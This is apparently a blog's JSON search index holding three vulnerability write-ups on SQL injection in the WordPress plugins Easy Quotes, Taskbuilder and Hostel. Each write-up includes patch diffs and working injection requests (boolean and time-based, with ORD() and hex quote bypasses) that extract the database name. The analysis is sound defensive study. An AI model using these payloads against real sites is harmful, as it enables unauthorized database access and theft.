\u0026#39;300\u0026#39; ); 👉 It’s recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lỗ hổng xảy ra trên plugin Easy Quotes của WordPress trước phiên bản 1.2.3. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) và v1.2.3(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Ứng dụng đã đưa trực tiếp dữ liệu từ người dùng vào câu query SQL mà không sử dụng các biện pháp bảo vệ khiến lỗ hổng SQL Injection xảy ra.\nPatch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } Bản vá sử dụng $wpdb-\u0026gt;prepare() thay vì truyền trực tiếp dữ liệu từ người dùng vào câu query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } Có nhiều hàm cũng được vá bằng cách trên, như: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() đã được vá nhưng nó không chứa dữ liệu từ người dùng, nên không cần quan tâm\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thác lỗi SQL Injection trong hàm get_family_data($family), các hàm còn lại khai thác tương tự.\nget_family_data() là hàm public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() được gọi trong 2 hàm get_family() và get_font_variants() của class Quotes_Data, để biết chúng sử dụng ở đâu, ta tìm kiến với từ khóa get_family hoặc get_font_variants\nHàm get_font_variants() được gọi trong hàm rest_route_callback_font_variants() của class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } Hàm khởi tạo của class Quotes_Rest_Route sử dụng add_action(hook_name, callback) với hook_name là rest_api_init để đăng ký các endpoint tùy chỉnh với REST API System của WordPress\nCallback rest_api_init sử dụng register_rest_route nhiều lần để tạo các endpoint dưới namespace layart/v1\nrest_route_callback_font_variants là callback của endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family mặc định là Shadows Into Light nếu không được truyền trong param.\nExploit Detect SQLi Ta thử kỹ thuật Boolean-based SQL Injection để kiểm tra xem tham số family có dễ bị chèn lệnh SQL hay không.\nTrue request: Khi đó, câu query thực thi sẽ trở thành:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Điều kiện AND '1'='1' luôn đúng =\u0026gt; query hợp lệ, trả về dữ liệu bình thường.\nFalse request: Khi đó, câu query thực thi sẽ trở thành:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Điều kiện AND '1'='2' luôn sai =\u0026gt; query không khớp =\u0026gt; trả về [].\nGet First Letter of Database Name Điều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì toàn bộ data đều dump được.\nDatabase name được tôi đặt tên là wordpress nên kí tự đầu tiên là w\nResponse trả về dữ liệu bình thường =\u0026gt; kí tự đầu tiên là w\nKhi đó, câu query thực thi sẽ trở thành:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion Lỗ hổng CVE-2025-26943 trong plugin WordPress Easy Quotes trước phiên bản 1.2.3 xuất phát từ việc không sử dụng cơ chế chuẩn bị truy vấn ($wpdb-\u0026gt;prepare) mà truyền trực tiếp dữ liệu từ người dùng vào câu lệnh SQL dẫn đến lỗ hổng SQL Injection.\nBản vá chính thức đã thay thế việc nối chuỗi bằng cách dùng $wpdb-\u0026gt;prepare, giúp đảm bảo dữ liệu đầu vào được kiểm soát và an toàn hơn.\nKey takeaways:\nLuôn sử dụng $wpdb-\u0026gt;prepare() khi làm việc với database trong WordPress để tránh SQL Injection. Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLỗ hổng xảy ra trên plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e của WordPress trước phiên bản \u003cstrong\u003e1.2.3\u003c/strong\u003e. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) và v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eỨng dụng đã đưa trực tiếp dữ liệu từ người dùng vào câu query SQL mà \u003cstrong\u003ekhông sử dụng các biện pháp bảo vệ\u003c/strong\u003e khiến lỗ hổng SQL Injection xảy ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\nCVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare differences between the vulnerable version and the patched version.\nThe clear difference is in the file includes/admin/projects/get_users.php.\nIn version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.\nHow It Works File Architecture:\nGeneral structure of the current file:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory.\n👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook.\nWPPM_Admin constructor:\nfinal class WPPM_Admin { public function __construct() { // other actions add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;, array($this,\u0026#39;wppm_get_users\u0026#39;)); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook.\nwp_ajax_wppm_get_users is an Ajax hook name:\nwp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users().\n👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin.\nThe wppm_get_users action is the data part in the POST request handled by wppm_get_users().\nThe function is referenced in HTML attributes of the project feature:\nCreate a new project Access that project Inspect code to locate wppm_get_users and see which actions call it 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML.\nExploit Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Response delay indicates a successful SQL Injection.\nGet First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.\nSend a boolean-based SQLi payload with the correct proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77).\nSUBSTRING(STRING,1,1) retrieves the first character.\nHere, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users.\nUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used.\nSend a boolean-based SQLi payload with a wrong proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None.\n👉 We successfully retrieved the first character of the database name using boolean-based SQLi:\nCorrect proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow.\nConclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax.\nThe patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL.\nKey Takeaways:\nPrefer prepared statements ($wpdb-\u0026gt;prepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. References SQL Injection Cheat Sheet - PortSwigger\nWordPress Taskbuilder \u0026lt;= 4.0.1 Vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eTaskbuilder\u003c/strong\u003e WordPress plugin before version \u003cstrong\u003e4.0.2\u003c/strong\u003e. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Taskbuilder Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e: v4.0.1 (vulnerable) and v4.0.2 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool that can compare files to see differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application \u003cstrong\u003esanitizes input data\u003c/strong\u003e before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes \u003ccode\u003e'...'\u003c/code\u003e. This allows an attacker to inject valid SQL syntax (such as \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e, etc.) into the query, resulting in a SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings — indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed → SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL 